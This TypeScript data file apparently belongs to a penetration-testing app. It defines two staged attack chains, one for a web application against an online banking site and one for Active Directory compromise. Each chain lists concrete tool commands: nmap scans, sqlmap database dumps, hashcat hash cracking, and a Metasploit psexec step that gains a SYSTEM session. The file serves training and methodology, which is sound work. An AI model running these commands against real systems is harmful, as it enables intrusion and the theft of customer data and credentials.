import type { AttackChain } from '@/types/offensive';

export const ATTACK_CHAINS: AttackChain[] = [
  {
    id: 'ac-webapp', name: 'Web Application Penetration Test', description: 'Complete web application attack chain from reconnaissance through exploitation and reporting.',
    mitreMapping: ['T1595', 'T1190', 'T1059', 'T1005'], totalSteps: 8,
    stages: [
      { order: 1, tool: 'theHarvester', toolId: 'tool-nmap', objective: 'Gather email addresses, subdomains, and IP ranges from public sources', command: 'theHarvester -d gfs.com -b google,linkedin', expectedOutcome: 'List of email addresses and subdomains', nextStep: 'Use discovered subdomains for DNS enumeration' },
      { order: 2, tool: 'dnsrecon', toolId: 'tool-nmap', objective: 'Enumerate DNS records to map the attack surface', command: 'dnsrecon -d gfs.com -t std', expectedOutcome: 'Full DNS zone map with IP addresses', nextStep: 'Use discovered IPs for network scanning' },
      { order: 3, tool: 'Nmap', toolId: 'tool-nmap', objective: 'Discover open ports, services, and versions on target hosts', command: 'nmap -sV -sC -oA gfs-scan 10.10.10.101', expectedOutcome: 'Port and service inventory for WEB-01', nextStep: 'Analyze web application with directory brute forcing' },
      { order: 4, tool: 'Gobuster', toolId: 'tool-gobuster', objective: 'Discover hidden directories and files', command: 'gobuster dir -u https://ibanking.gfs.com -w common.txt', expectedOutcome: 'Hidden paths: /admin, /backup, /debug', nextStep: 'Scan discovered paths for vulnerabilities' },
      { order: 5, tool: 'Nikto', toolId: 'tool-nikto', objective: 'Scan web server for misconfigurations and known vulnerabilities', command: 'nikto -h https://ibanking.gfs.com -ssl', expectedOutcome: 'Server misconfigurations and security header gaps', nextStep: 'Deep-dive testing with Burp Suite' },
      { order: 6, tool: 'Burp Suite', toolId: 'tool-burp', objective: 'Intercept and test all application functionality', command: 'Configure proxy → crawl application → test parameters', expectedOutcome: 'SQL injection confirmed on login page', nextStep: 'Exploit the SQL injection' },
      { order: 7, tool: 'SQLMap', toolId: 'tool-sqlmap', objective: 'Exploit SQL injection to extract data', command: 'sqlmap -u "URL?id=1" --dbs --dump', expectedOutcome: 'Database contents extracted — customer data', nextStep: 'Document all findings and generate report' },
      { order: 8, tool: 'Report', toolId: 'tool-nmap', objective: 'Document all findings with evidence and remediation', command: 'Compile engagement report', expectedOutcome: 'Complete penetration test report delivered to CISO', nextStep: 'Remediation verification' },
    ],
  },
  {
    id: 'ac-active-dir', name: 'Active Directory Attack Chain', description: 'Complete AD compromise from initial access to domain admin.',
    mitreMapping: ['T1078', 'T1558', 'T1003', 'T1484'], totalSteps: 6,
    stages: [
      { order: 1, tool: 'Nmap', toolId: 'tool-nmap', objective: 'Discover AD infrastructure — DC, domain trusts', command: 'nmap -sV -p 53,88,389,445 10.10.30.1', expectedOutcome: 'AD-DC01 confirmed with Kerberos, LDAP, SMB', nextStep: 'Enumerate AD users and groups' },
      { order: 2, tool: 'Netcat', toolId: 'tool-nmap', objective: 'Test for LDAP anonymous bind and enumerate users', command: 'ldapsearch -x -h 10.10.30.1 -b "dc=gfs,dc=com"', expectedOutcome: 'List of user accounts and group memberships', nextStep: 'Identify Kerberoastable accounts' },
      { order: 3, tool: 'Hashcat', toolId: 'tool-hashcat', objective: 'Crack Kerberoasted service account hashes', command: 'hashcat -m 13100 spn_hashes.txt rockyou.txt', expectedOutcome: 'svc-webapp password cracked: WebApp2024!', nextStep: 'Use cracked credentials for lateral movement' },
      { order: 4, tool: 'Metasploit', toolId: 'tool-metasploit', objective: 'Use cracked credentials to access file shares', command: 'use auxiliary/admin/smb/smb_enum_shares', expectedOutcome: 'Admin share accessible with svc-webapp credentials', nextStep: 'Extract credentials from share' },
      { order: 5, tool: 'Hashcat', toolId: 'tool-hashcat', objective: 'Crack dumped NTLM hashes from SAM database', command: 'hashcat -m 1000 sam_hashes.txt rockyou.txt', expectedOutcome: 'Administrator password cracked', nextStep: 'Achieve Domain Admin' },
      { order: 6, tool: 'Metasploit', toolId: 'tool-metasploit', objective: 'Establish persistent Domain Admin session', command: 'use exploit/windows/smb/psexec', expectedOutcome: 'Meterpreter session — SYSTEM on AD-DC01', nextStep: 'Document complete attack chain' },
    ],
  },
];
